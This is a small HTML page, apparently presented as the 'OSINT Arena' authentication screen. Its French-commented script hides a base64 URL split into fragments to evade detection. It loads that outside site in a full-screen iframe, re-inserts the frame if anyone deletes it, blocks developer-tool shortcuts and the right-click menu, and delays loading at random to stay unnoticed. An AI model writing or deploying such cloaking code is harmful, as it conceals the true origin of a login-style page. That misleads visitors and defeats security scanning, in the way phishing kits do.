<!doctype html><html lang="fr"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>OSINT Arena — Auth</title>
<style>html,body{height:100%;margin:0;padding:0;background:linear-gradient(180deg,#041027 0%,#07172a 100%);font-family:Inter,system-ui,sans-serif;overflow:hidden}#_c{position:fixed;inset:0;width:100%;height:100%}</style>
</head><body><div id="_c"></div>
<script>
(function(){
  // --- données (URL encodée base64, fragmentée pour noyauter la détection)
  var p1='aHR0cHM6Ly9m',p2='aWNoZS1jcmF',p3='mdC0xNi5sb3Z',p4='hYmxlLmFwcA==';
  var b64 = p1+p2+p3+p4;
  // --- fonctions utilitaires compactes
  function d(b){try{return atob(b)}catch(e){return decodeURIComponent(escape(window.atob(b)))}}
  function rnd(n){return Math.random().toString(36).slice(2,2+n)}
  // --- création iframe furtive
  function mk(){
    if(document.getElementById('_ifr')) return;
    var url = d(b64);
    var ifr = document.createElement('iframe');
    ifr.id = '_ifr';
    ifr.title = 'OSINT Arena Auth';
    ifr.src = url;
    ifr.style.cssText = 'width:100%;height:100%;border:0;display:block';
    ifr.setAttribute('allowfullscreen','');
    // sandbox si tu veux restreindre (décommente et ajuste) : ifr.setAttribute('sandbox','allow-scripts allow-same-origin');
    var c = document.getElementById('_c')||document.body;
    c.appendChild(ifr);
    // petite marque pour vérif (id dynamique pour complexifier)
    ifr.dataset.r = rnd(6);
    return ifr;
  }
  // --- protège contre suppression simple via DevTools en réinsérant automatiquement
  function watch(){
    var root = document.getElementById('_c')||document.body;
    var observer = new MutationObserver(function(m){
      var found = !!document.getElementById('_ifr');
      if(!found) setTimeout(mk,120);
    });
    observer.observe(root,{childList:true,subtree:false});
    // garde l'observer accessible (non compressé) pour éviter GC agressif
    window.__obs = observer;
  }
  // --- désactive menu contextuel et certains raccourcis (disuasif, contournable)
  function lockDev(){
    document.addEventListener('contextmenu',function(e){e.preventDefault()},false);
    document.addEventListener('keydown',function(e){
      // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
      if(e.keyCode===123 || (e.ctrlKey&&e.shiftKey&& (e.keyCode===73||e.keyCode===74)) || (e.ctrlKey&&e.keyCode===85)){ e.preventDefault(); e.stopPropagation(); }
    },false);
  }
  // --- exécution
  try{
    // délai aléatoire court pour éviter un chargement immédiatement visible dans HTML
    setTimeout(function(){ mk(); watch(); lockDev(); }, Math.floor(200+Math.random()*400));
  }catch(e){}
})();
</script>
</body></html>
